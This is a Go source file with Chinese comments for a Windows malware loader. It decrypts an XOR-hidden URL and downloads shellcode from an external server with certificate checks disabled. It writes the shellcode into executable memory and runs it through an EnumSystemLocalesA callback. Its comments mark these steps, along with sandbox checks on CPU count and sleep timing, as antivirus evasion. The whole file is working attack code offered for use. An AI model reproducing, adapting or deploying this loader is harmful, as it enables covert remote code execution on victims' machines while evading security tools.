package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// [配置] Shellcode 的下载地址 (请确保 payload.bin 已上传到服务器)
//const ShellcodeURL = "https://api.cailiu666.xyz/payload.bin"

// Windows API 定义
var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory       = ntdll.NewProc("RtlMoveMemory")
	enumSystemLocalesA   = kernel32.NewProc("EnumSystemLocalesA")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func main() {
	// 环境检测
	if checkResources() || checkTimeDistortion() {
		return // 悄悄退出
	}

	// 1. 启动提示
	fmt.Println("[*] Loader 启动...")

	//解密URL
	encryptedURL := []byte{0xe0, 0xfc, 0xfc, 0xf8, 0xfb, 0xb2, 0xa7, 0xa7, 0xe9, 0xf8, 0xe1, 0xa6, 0xeb, 0xe9, 0xe1, 0xe4, 0xe1, 0xfd, 0xbe, 0xbe, 0xbe, 0xa6, 0xf0, 0xf1, 0xf2, 0xa7, 0xf8, 0xe9, 0xf1, 0xe4, 0xe7, 0xe9, 0xec, 0xa6, 0xea, 0xe1, 0xe6, }
	ShellcodeURL := xorDecrypt(encryptedURL, 0x88)
	// 2. 下载 Shellcode
	fmt.Printf("[*] 正在下载 Payload: %s\n", ShellcodeURL)
	shellcode, err := downloadShellcode(ShellcodeURL)
	if err != nil {
		fmt.Printf("[!] 下载失败: %v\n", err)
		fmt.Println("[!] 请检查: 1. Server是否启动 2. payload.bin是否上传")
		time.Sleep(5 * time.Second)
		return
	}
	fmt.Printf("[+] 下载成功，大小: %d bytes\n", len(shellcode))

	if len(shellcode) == 0 {
		fmt.Println("[!] 错误: 下载到的 Payload 为空")
		return
	}

	// 3. 申请内存 (VirtualAlloc)
	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Println("[!] 内存申请失败:", err)
		return
	}
	fmt.Printf("[+] 内存申请成功: 0x%x\n", addr)

	// 4. 写入 Shellcode (RtlMoveMemory)
	_, _, _ = RtlMoveMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	fmt.Println("[+] Payload 已注入内存")

	// 5. 执行 Shellcode (CreateThread)
	// [免杀5] 回调函数执行 (Callback Execution)
	// 不使用 CreateThread，而是利用系统枚举函数的“回调”机制来执行我们的 Shellcode
	// EnumSystemLocalesA 会调用第一个参数指向的地址
	enumSystemLocalesA.Call(addr, 0)
	fmt.Println("[+] 线程已启动! Agent 正在内存中运行...")

}

func downloadShellcode(url string) ([]byte, error) {
	// 跳过证书验证 (防止虚拟机根证书问题)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP状态码错误: %d", resp.StatusCode)
	}

	return io.ReadAll(resp.Body)
}

// [免杀1] XOR 解密函数
func xorDecrypt(data []byte, key byte) string {
	decrypted := make([]byte, len(data))
	for i, b := range data {
		decrypted[i] = b ^ key
	}
	return string(decrypted)
}

// [免杀2] 高级反沙箱: 时间扭曲检测
func checkTimeDistortion() bool {
	start := time.Now()
	// 休眠 3 秒
	time.Sleep(3 * time.Second)
	end := time.Now()
	
	// 如果实际流逝时间小于 2.5 秒，说明系统时间被加速了（沙箱特征）
	if end.Sub(start) < 2500*time.Millisecond {
		return true // 是沙箱
	}
	return false
}

// [免杀3] 资源检测
func checkResources() bool {
	if runtime.NumCPU() < 2 { return true }
	return false
}